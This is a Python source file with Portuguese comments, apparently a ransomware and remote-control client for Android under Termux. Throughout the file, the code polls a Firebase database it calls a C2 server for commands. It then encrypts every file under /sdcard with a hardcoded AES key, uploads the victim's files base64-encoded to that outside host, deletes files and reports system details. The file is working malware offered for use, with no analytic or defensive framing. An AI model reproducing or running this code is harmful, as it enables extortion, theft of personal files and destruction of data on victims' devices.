import os
import time
import base64
import json
import requests
import platform
from datetime import datetime
from hashlib import sha256
from Crypto.Cipher import AES

# --- Configuração ---
database_url = "https://vibe-chat-b1e67-default-rtdb.firebaseio.com"
vitima_id = "KIRA-PC"  # Mude para algo único por dispositivo
senha = "hackerkira12345"
pasta_alvo = "/sdcard"
url_base = f"{database_url}/vítimas/{vitima_id}"

# --- Utilidades ---
def gerar_chave(senha):
    return sha256(senha.encode()).digest()

def preencher(bloco):
    while len(bloco) % 16 != 0:
        bloco += b' '
    return bloco

def enviar_resposta(nome_comando, dados):
    try:
        requests.put(f"{url_base}/resposta.json", data=json.dumps({nome_comando: dados}))
    except:
        pass

# --- Comandos ---
def criptografar():
    chave = gerar_chave(senha)
    total = 0
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            path = os.path.join(dirpath, file)
            try:
                with open(path, "rb") as f:
                    dados = f.read()
                cipher = AES.new(chave, AES.MODE_ECB)
                cifrado = cipher.encrypt(preencher(dados))
                with open(path, "wb") as f:
                    f.write(cifrado)
                total += 1
            except:
                continue
    enviar_resposta("criptografar", f"{total} arquivos criptografados.")

def descriptografar():
    chave = gerar_chave(senha)
    total = 0
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            path = os.path.join(dirpath, file)
            try:
                with open(path, "rb") as f:
                    dados = f.read()
                cipher = AES.new(chave, AES.MODE_ECB)
                decifrado = cipher.decrypt(dados).rstrip(b' ')
                with open(path, "wb") as f:
                    f.write(decifrado)
                total += 1
            except:
                continue
    enviar_resposta("descriptografar", f"{total} arquivos descriptografados.")

def listar_arquivos():
    arquivos = []
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            arquivos.append(os.path.join(dirpath, file))
    enviar_resposta("listar_arquivos", arquivos)

def copiar_arquivos():
    copiados = []
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            path = os.path.join(dirpath, file)
            try:
                with open(path, "rb") as f:
                    conteudo = base64.b64encode(f.read()).decode()
                nome_seguro = file.replace(".", "_")
                requests.put(f"{url_base}/copias/{nome_seguro}.json", data=json.dumps(conteudo))
                copiados.append(file)
            except:
                continue
    enviar_resposta("copiar_arquivos", f"{len(copiados)} arquivos copiados.")

def deletar_arquivos():
    deletados = 0
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            try:
                os.remove(os.path.join(dirpath, file))
                deletados += 1
            except:
                continue
    enviar_resposta("deletar_arquivos", f"{deletados} arquivos deletados.")

def mostrar_mensagem():
    try:
        os.system("termux-toast '⚠️ Alerta do servidor C2 ⚠️'")
        enviar_resposta("mostrar_mensagem", "Mensagem exibida com sucesso.")
    except:
        enviar_resposta("mostrar_mensagem", "Erro ao exibir mensagem.")

def capturar_data():
    agora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    enviar_resposta("capturar_data", agora)

def enviar_info():
    info = {
        "sistema": platform.system(),
        "versao": platform.version(),
        "nome": platform.node(),
        "plataforma": platform.platform(),
    }
    enviar_resposta("enviar_info", info)

# --- Loop principal ---
def escutar():
    requests.put(f"{url_base}/status.json", data=json.dumps(True))
    while True:
        try:
            resp = requests.get(f"{url_base}/comando.json")
            if resp.status_code == 200:
                comando = resp.json()
                if comando:
                    print(f"🚨 COMANDO RECEBIDO: {comando}")
                    if comando == "criptografar":
                        criptografar()
                    elif comando == "descriptografar":
                        descriptografar()
                    elif comando == "listar_arquivos":
                        listar_arquivos()
                    elif comando == "copiar_arquivos":
                        copiar_arquivos()
                    elif comando == "deletar_arquivos":
                        deletar_arquivos()
                    elif comando == "mostrar_mensagem":
                        mostrar_mensagem()
                    elif comando == "capturar_data":
                        capturar_data()
                    elif comando == "enviar_info":
                        enviar_info()

                    # Limpa o comando após execução
                    requests.put(f"{url_base}/comando.json", data=json.dumps(None))
            time.sleep(3)
        except:
            time.sleep(5)

# --- Execução ---
if __name__ == "__main__":
    escutar()
